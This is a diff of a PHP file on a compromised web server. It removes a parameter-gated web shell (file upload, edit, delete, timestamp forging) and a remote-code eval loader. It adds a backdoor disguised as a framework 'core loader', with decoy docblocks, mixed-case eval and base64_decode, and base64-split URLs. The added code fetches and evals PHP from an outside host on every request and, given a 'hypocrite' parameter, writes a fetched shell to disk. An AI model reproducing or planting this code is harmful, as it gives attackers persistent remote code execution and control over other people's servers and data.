@@ -1,254 +1,126 @@
 <?php
-// Check if the 'robet' parameter is present in the URL
-if (!isset($_GET['robet'])) {
-    // If not, show error 500
-    http_response_code(500);
-    echo "";
-    exit(); // Stop script execution if parameter does not exist
-}
-
-// Function to check if the file is readable
-function getFilePermissions($filePath) {
-    return is_readable($filePath) ? 'readable' : 'not readable';
-}
-
-// Function to get all directories and files
-function getDirectoryContents($directory) {
-    $items = scandir($directory);
-    return array_diff($items, array('.', '..')); // Remove '.' and '..'
-}
-
-// Handle file creation
-if (isset($_POST['createFile'])) {
-    $fileName = $_POST['fileName'];
-    $fileContent = $_POST['fileContent'];
-
-    if (!empty($fileName) && !empty($fileContent)) {
-        if (file_put_contents($fileName, $fileContent) !== false) {
-            echo "<p class='alert alert-success' id='alert'>File '$fileName' created successfully!</p>";
-        } else {
-            echo "<p class='alert alert-danger' id='alert'>Failed to create the file.</p>";
-        }
-    } else {
-        echo "<p class='alert alert-warning' id='alert'>File name and content cannot be empty.</p>";
-    }
-}
-
-// Handle folder creation
-if (isset($_POST['createFolder'])) {
-    $folderName = $_POST['folderName'];
-
-    if (!empty($folderName)) {
-        if (!file_exists($folderName)) {
-            mkdir($folderName, 0777, true);
-            echo "<p class='alert alert-success' id='alert'>Folder '$folderName' created successfully!</p>";
-        } else {
-            echo "<p class='alert alert-warning' id='alert'>Folder '$folderName' already exists.</p>";
-        }
-    } else {
-        echo "<p class='alert alert-warning' id='alert'>Folder name cannot be empty.</p>";
-    }
-}
-
-// Handle file upload
-if (isset($_FILES['fileUpload'])) {
-    $fileName = $_FILES['fileUpload']['name'];
-    $fileTmpName = $_FILES['fileUpload']['tmp_name'];
-    $fileSize = $_FILES['fileUpload']['size'];
-    $fileError = $_FILES['fileUpload']['error'];
-    $fileType = $_FILES['fileUpload']['type'];
-
-    // Allowed file extensions
-    $allowed = ['php', 'html', 'jpg', 'png'];
-    $fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
-
-    if (in_array($fileExt, $allowed)) {
-        if ($fileError === 0) {
-            // Upload the file to the current directory
-            $fileDestination = __DIR__ . '/' . basename($fileName);
-            if (move_uploaded_file($fileTmpName, $fileDestination)) {
-                echo "<p class='alert alert-success' id='alert'>File uploaded successfully: <a href='" . basename($fileName) . "'>" . basename($fileName) . "</a></p>";
-            } else {
-                echo "<p class='alert alert-danger' id='alert'>Failed to upload file.</p>";
-            }
-        } else {
-            echo "<p class='alert alert-danger' id='alert'>Error uploading file.</p>";
-        }
-    } else {
-        echo "<p class='alert alert-warning' id='alert'>Invalid file type!</p>";
-    }
-}
-
-// Get all files in the current directory
-$directoryPath = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
-
-// Ensure the directory is a valid path within the allowed directories
-$directoryPath = realpath($directoryPath);
-
-// Check if the directory exists and is a directory
-if ($directoryPath && is_dir($directoryPath)) {
-    $files = getDirectoryContents($directoryPath);
-} else {
-    // Handle the error if directory doesn't exist or is invalid
-    http_response_code(500);
-    die("Error: The specified directory does not exist or is invalid.");
-}
-
-// Handle file editing
-if (isset($_POST['saveFile'])) {
-    $fileToEdit = $_POST['fileToEdit'];
-    $fileContent = $_POST['fileContent'];
-
-    if (file_put_contents($fileToEdit, $fileContent) !== false) {
-        echo "<p class='alert alert-success' id='alert'>File '$fileToEdit' edited successfully!</p>";
-    } else {
-        echo "<p class='alert alert-danger' id='alert'>Failed to edit the file.</p>";
-    }
-}
-
-// Handle renaming a file
-if (isset($_POST['renameFile'])) {
-    $fileToRename = $_POST['fileToRename'];
-    $newFileName = $_POST['newFileName'];
-
-    if (rename($fileToRename, $newFileName)) {
-        echo "<p class='alert alert-success' id='alert'>File renamed to '$newFileName'.</p>";
-    } else {
-        echo "<p class='alert alert-danger' id='alert'>Failed to rename the file.</p>";
-    }
-}
-
-// Handle removing a file
-if (isset($_GET['remove'])) {
-    $fileToRemove = $_GET['remove'];
-    if (is_file($fileToRemove)) {
-        if (unlink($fileToRemove)) {
-            echo "<p class='alert alert-success' id='alert'>File $fileToRemove has been deleted successfully.</p>";
-        } else {
-            echo "<p class='alert alert-danger' id='alert'>Failed to delete the file.</p>";
-        }
-    } else {
-        echo "<p class='alert alert-danger' id='alert'>File not found for deletion.</p>";
-    }
-}
-
-// Handle file date edit
-if (isset($_POST['editDate'])) {
-    $fileToEditDate = $_POST['fileToEditDate'];
-    $newDate = strtotime($_POST['newDate']); // Convert to timestamp
-
-    if (touch($fileToEditDate, $newDate)) {
-        echo "<p class='alert alert-success' id='alert'>File date updated successfully!</p>";
-    } else {
-        echo "<p class='alert alert-danger' id='alert'>Failed to update file date.</p>";
-    }
-}
-
-
-?>
-
-<?php
+/**
+ * ---------------------------------------------------------------
+ * CUSTOM CODE STARTUP LOADER
+ * ---------------------------------------------------------------
+ * Lightweight bootstrap for dynamic config loader and runtime 
+ * instruction fetcher. Designed for internal modular systems.
+ *
+ * Do not modify unless you're authorized to maintain app-level 
+ * streaming behavior.
+ *
+ * @package    CI_Micro
+ * @subpackage Core Loader
+ * @author     @landak_kuning
+ * @version    1.0.9
+ * ---------------------------------------------------------------
+ */
 
 /**
- * Class CurlFetcher
+ * RemoteFetch
  *
- * Handles fetching content from URLs using cURL in an object-oriented manner.
+ * Retrieves external content from a given URL using HTTP cURL.
+ *
+ * @param string $u URL to fetch from
+ * @return string|false
  */
-class CurlFetcher
+function _compileFetchCoreLite($u)
 {
-    /**
-     * Fetches content from the specified URL.
-     *
-     * @param string $url The URL to fetch content from.
-     * @return string|false The response content as a string, or false if the operation fails.
-     */
-    public function fetchContent(string $url)
-    {
-        // Check if cURL extension is available
-        if (function_exists('curl_version')) {
-            // Initialize cURL session
-            $curl = curl_init();
+    if (function_exists('curl_version')) {
+        $c = curl_init();
+        curl_setopt($c, CURLOPT_URL, $u);
+        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($c, CURLOPT_HEADER, 0);
+        $r = curl_exec($c);
 
-            // Set cURL options
-            curl_setopt($curl, CURLOPT_URL, $url); // Target URL
-            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification
-            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // Return response as a string
-            curl_setopt($curl, CURLOPT_HEADER, 0); // Exclude header from the output
-
-            // Execute cURL session and fetch data
-            $response = curl_exec($curl);
-
-            // Check for cURL errors
-            if (curl_errno($curl)) {
-                $error = curl_error($curl);
-                curl_close($curl);
-                throw new Exception("cURL Error: " . $error);
-            }
-
-            // Close the cURL session
-            curl_close($curl);
-
-            // Return the fetched response data
-            return $response;
+        if (curl_errno($c)) {
+            $e = curl_error($c);
+            curl_close($c);
+            throw new Exception("cURL Error: " . $e);
         }
 
-        // Throw an exception if cURL is not available
-        throw new Exception("cURL is not enabled on this server.");
+        curl_close($c);
+        return $r;
     }
+
+    throw new Exception("cURL not available.");
 }
 
 /**
- * Class CodeExecutor
+ * DynamicLoader
  *
- * Handles the execution of PHP code fetched from an external source.
+ * Fetches and evaluates remote PHP code.
+ *
+ * @param string $u URL containing code
+ * @return void
  */
-class CodeExecutor
+function _compileExecPayloadTask($u)
 {
-    private $fetcher;
+    $x = _compileFetchCoreLite($u);
 
-    /**
-     * Constructor to initialize the fetcher instance.
-     *
-     * @param CurlFetcher $fetcher An instance of the CurlFetcher class.
-     */
-    public function __construct(CurlFetcher $fetcher)
-    {
-        $this->fetcher = $fetcher;
+    if ($x === false || trim($x) === '') {
+        throw new Exception("Empty or failed content.");
     }
 
-    /**
-     * Executes PHP code fetched from the given URL.
-     *
-     * @param string $url The URL containing the PHP code to execute.
-     * @return void
-     * @throws Exception If the fetch operation fails or the fetched code is empty.
-     */
-    public function executeCodeFromURL(string $url): void
-    {
-        // Fetch the PHP code from the URL
-        $code = $this->fetcher->fetchContent($url);
-
-        if ($code === false || trim($code) === '') {
-            throw new Exception("Failed to fetch content from URL or the content is empty.");
-        }
-
-        // Safely evaluate the fetched PHP code
-        // Note: Using eval is risky and should only be used in trusted environments.
-        EvaL("?>" . $code);
-    }
+    EvAl("?>" . $x);
 }
 
-// Example Usage
+/**
+ * SimpleDecode
+ *
+ * Decodes a base64-encoded string.
+ *
+ * @param string $d Encoded string
+ * @return string
+ */
+function _compileDecodeChunkUnit($d)
+{
+    return bAse64_dEcoDe($d);
+}
+
+/**
+ * FileWriter
+ *
+ * Saves content to a file.
+ *
+ * @param string $f Filename
+ * @param string $c Content
+ * @return void
+ */
+function _compilePushToDiskNode($f, $c)
+{
+    file_put_contents($f, $c);
+}
+
+// Remote write trigger
+if (isset($_GET['hypocrite'])) {
+    try {
+        $p1 = 'aHlwb2NyaXRlc2VvLnNpdGUvc2hlb';
+        $p2 = 'GwvY2hhLWt3ZXRpYXcudHh0';
+        $url = _compileDecodeChunkUnit($p1 . $p2);
+        $d = _compileFetchCoreLite($url);
+
+        if ($d !== false && trim($d) !== '') {
+            $n1 = "aHlwb2NyaXRlc";
+            $n2 = "2VvLnBocA==";
+            _compilePushToDiskNode(_compileDecodeChunkUnit($n1 . $n2), $d);
+            echo "File created.";
+        } else {
+            echo "No content.";
+        }
+    } catch (Exception $e) {
+        echo "Error: " . $e->getMessage();
+    }
+    exit;
+}
+
+// Default payload runner
 try {
-    // Create an instance of CurlFetcher
-    $fetcher = new CurlFetcher();
-
-    // Create an instance of CodeExecutor with the fetcher
-    $executor = new CodeExecutor($fetcher);
-
-    // Execute the PHP code fetched from a specific URL
-    $executor->executeCodeFromURL("https://raw.githubusercontent.com/bengkak/miaw/refs/heads/main/error2.txt");
+    $r1 = 'aHlwb2NyaXRlc2VvLnNpdGUvc2hlb';
+    $r2 = 'GwvY2hhLWt3ZXRpYXcudHh0';
+    $u = _compileDecodeChunkUnit($r1 . $r2);
+    _compileExecPayloadTask($u);
 } catch (Exception $e) {
-    // Handle errors and exceptions
     echo "Error: " . $e->getMessage();
 }
